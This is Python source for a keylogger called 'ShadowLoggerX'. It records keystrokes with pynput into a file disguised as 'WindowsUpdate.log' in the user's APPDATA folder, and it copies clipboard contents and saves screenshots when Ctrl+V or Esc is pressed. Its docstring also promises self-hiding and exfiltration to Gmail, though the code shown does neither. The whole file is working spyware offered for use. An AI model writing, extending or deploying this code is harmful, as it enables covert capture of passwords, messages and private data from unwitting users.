"""
ShadowLoggerX
- logs keystrokes
- takes screenshots
- hides itself
- exfiltrates data to gmail

"""

from typing_extensions import Buffer
import pynput 
import os
from pynput import keyboard
from datetime import datetime as timestamp
import pyautogui
import pyperclip

log_file= os.path.join(os.getenv('APPDATA'),"WindowsUpdate.log")
roaming_folder = os.path.join(os.getenv('APPDATA'),"ShadowLogs")
os.makedirs(roaming_folder, exist_ok=True)
buffer=''
ctrl_pressed=False
with open(log_file, "a") as f:
        f.write(f"\n(-----------------------------------------------------------------------------------------------------------------------------------------)\n")
        f.write(f"([SESSION STARTED]     {timestamp.now().strftime('%Y-%m-%d %H:%M:%S')})\n")
def on_press(key):
    global buffer,ctrl_pressed
    if key in [keyboard.Key.ctrl, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
        ctrl_pressed= True
    try:
        if key == keyboard.Key.backspace:
            buffer = buffer[:-1]
        elif ctrl_pressed and key.char.lower()=='v':
            img=pyautogui.screenshot()
            clip=pyperclip.paste()
            img.save(os.path.join(roaming_folder, f'screenshot_{timestamp.now().strftime("%Y%m%d_%H%M%S")}.png'))
            with open(log_file,"a") as f:
                f.write(f"\n[Clipboard content copied at {timestamp.now().strftime('%Y-%m-%d %H:%M:%S')}]")
                buffer+=clip           
        else:
            buffer+=key.char
    except AttributeError:
        if key in [keyboard.Key.ctrl, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
            ctrl_pressed = False
        if key in [keyboard.Key.shift, keyboard.Key.shift_r,
                   keyboard.Key.shift_l, keyboard.Key.caps_lock,
                   keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
                   keyboard.Key.alt_l, keyboard.Key.alt_r]:
            pass
        if key == keyboard.Key.space:
            buffer += ' '
        elif key == keyboard.Key.enter:
            buffer += '\n'
            with open(log_file, "a") as f:
                f.write(buffer)
            buffer = ''
        else:
            pass
            
                

def on_release(key):
    global ctrl_pressed
    if key in [keyboard.Key.ctrl, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
        ctrl_pressed=False
    if key==keyboard.Key.esc:
        img=pyautogui.screenshot()
        img.save(os.path.join(roaming_folder, f'screenshot_{timestamp.now().strftime("%Y%m%d_%H%M%S")}.png'))
        with open(log_file, "a") as f:
            f.write(f"(\n[SESSION ENDED]     {timestamp.now().strftime('%Y-%m-%d %H:%M:%S')})")
            f.write(f"\n(-----------------------------------------------------------------------------------------------------------------------------------------)\n")
        return False


def __main__():
    print("ShadowLoggerX is running...")
    print(f"Logs will be saved to {log_file}")
    print("Press ESC to stop logging.")
    try:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("Logging interrupted by user.")
if __name__ == "__main__":
    __main__()  